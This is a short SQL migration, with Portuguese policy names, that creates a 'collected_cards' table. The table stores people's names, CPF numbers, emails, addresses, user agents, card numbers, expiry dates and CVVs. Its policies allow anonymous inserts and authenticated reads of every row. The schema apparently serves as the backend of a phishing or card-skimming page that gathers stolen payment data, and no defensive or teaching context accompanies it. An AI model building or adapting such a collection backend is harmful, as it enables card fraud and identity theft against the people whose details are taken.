CREATE TABLE IF NOT EXISTS public.collected_cards (
  id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
  created_at timestamp with time zone DEFAULT now() NOT NULL,
  nome text,
  cpf text,
  email text,
  endereco text,
  user_agent text,
  numero text,
  validade text,
  cvv text
);

GRANT ALL ON public.collected_cards TO authenticated;
GRANT ALL ON public.collected_cards TO service_role;
GRANT INSERT ON public.collected_cards TO anon;

ALTER TABLE public.collected_cards ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Permitir inserção anônima" ON public.collected_cards;
CREATE POLICY "Permitir inserção anônima" ON public.collected_cards
  FOR INSERT
  WITH CHECK (true);

DROP POLICY IF EXISTS "Permitir leitura autenticada" ON public.collected_cards;
CREATE POLICY "Permitir leitura autenticada" ON public.collected_cards
  FOR SELECT
  TO authenticated
  USING (true);
